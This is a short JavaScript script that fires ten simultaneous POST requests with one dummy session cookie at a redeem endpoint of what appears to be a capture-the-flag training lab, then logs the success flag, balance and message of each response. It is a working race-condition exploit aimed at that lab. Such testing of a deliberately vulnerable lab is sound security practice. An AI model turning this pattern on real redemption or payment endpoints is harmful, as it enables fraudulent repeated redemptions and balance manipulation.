// using native fetch

async function testRaceConditionVercel() {
  console.log("Testing Race Condition on ctf-sage.vercel.app...");
  
  const dummyCookie = `lab-session=test-race-vercel-${Date.now()}`;
  
  console.log(`Sending 10 concurrent requests with ${dummyCookie}`);
  
  const promises = [];
  for (let i = 0; i < 10; i++) {
    promises.push(
      fetch("https://ctf-sage.vercel.app/api/labs/a06-3/redeem", {
        method: "POST",
        headers: {
          "Cookie": dummyCookie
        }
      }).then(r => r.json())
    );
  }
  
  const results = await Promise.all(promises);
  console.log("Results:");
  results.forEach((r, i) => {
    console.log(`Req ${i+1}: Success=${r.success}, Balance=${r.balance}, Msg=${r.message}`);
  });
}

testRaceConditionVercel();
